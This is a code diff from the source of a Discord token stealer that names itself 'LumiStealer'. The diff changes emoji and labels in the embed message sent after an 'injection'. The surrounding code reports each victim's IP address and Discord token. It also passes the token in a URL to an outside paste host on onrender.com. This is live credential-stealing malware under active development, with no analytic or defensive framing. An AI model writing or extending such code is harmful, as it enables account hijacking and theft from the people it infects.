@@ -271,7 +271,7 @@ async function initOne() {
   var client_discord = appName;
 
   const embed = {
-    title: '<:r_diabinho_Angelz:1007886402186391583> First Injection Detected - LumiStealer',
+    title: 'First Injection Detected - LumiStealer',
     color: 0x5a0998,
     fields: [
         {
@@ -290,13 +290,13 @@ async function initOne() {
             inline: true
         },
         {
-            name: "IP:",
-            value: "<:r_purple19_emoji:1247251239255670905> `" + ip + "`",
+            name: " IP Address:",
+            value: "<:lupa:1249813644750098534> `" + ip + "`",
             inline: true
         },
         {
             name: "Token:",
-            value: "<:Designsemnome:1249821084111470683> `" + token + "`\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + token + ")",
+            value: "`" + token + "`\n[Copy Token](https://paste-pgpj.onrender.com/?p=" + token + ")",
             inline: false
         },
     ],
